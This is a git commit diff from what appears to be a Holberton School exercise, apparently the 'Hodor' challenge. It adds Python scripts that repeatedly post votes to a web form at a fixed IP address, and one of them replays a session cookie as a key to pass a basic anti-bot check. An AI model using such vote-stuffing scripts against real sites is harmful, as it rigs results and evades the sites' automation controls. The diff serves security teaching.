95316731af539935ae08ee2d9f3fe831e58d399b
Stuart Kuredjian <108@holbertonschool.com>
2017-05-13 00:25:48 +0000

    1. hodor_1.py: initial commit; 2. level_0.py: add final votes check

--- level_0/hodor_0.py
+++ level_0/hodor_0.py
@@ -3,20 +3,21 @@ import requests
 from  functions import fetch_vote_count
 import re
 
-userid = input("Enter userid to vote for:")
+URL = "http://54.221.6.249/level0.php"
+userid = input("Enter userid to vote for: ")
 vote_limit = int(input("Enter number of times to vote: "))
 payload = {
     'id': userid,
     'holdthedoor': 'Submit+Query'
 }
-start_votes = fetch_vote_count(userid)
+start_votes = fetch_vote_count(userid, URL)
 print("Votes before run: {:s}".format(start_votes))
 print("Voting {:d} times".format(vote_limit))
 
 for i in range(0,vote_limit):
     print(i+1)
-    r = requests.post("http://54.221.6.249/level0.php", data=payload)
+    r = requests.post(URL, data=payload)
 
-end_votes = fetch_vote_count(userid)
-print("Starting votes: {:s}".format(start_votes))
-print("Ending votes: {:s}".format(end_votes))
+end_votes = fetch_vote_count(userid, URL)
+votes_cast = int(end_votes) - int(start_votes)
+print("Votes cast: {:d}".format(votes_cast))
---
+++ level_1/hodor_1.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python3
+import requests
+from  functions import fetch_vote_count
+
+URL = "http://54.221.6.249/level1.php"
+r = requests.get(URL)
+key = r.cookies["HoldTheDoor"]
+userid = "108"
+start_votes = fetch_vote_count(userid, URL)
+payload = {
+    "id": userid,
+    "holdthedoor": "Submit+Query",
+    "key": key
+}
+for i in range(1):
+    r = requests.post(URL, data=payload, cookies={"HoldTheDoor": key})
+    print(i+1)
+end_votes = fetch_vote_count(userid, URL)
+votes_cast = int(end_votes) - int(start_votes)
+print("Vortes cast: {:d}".format(votes_cast))
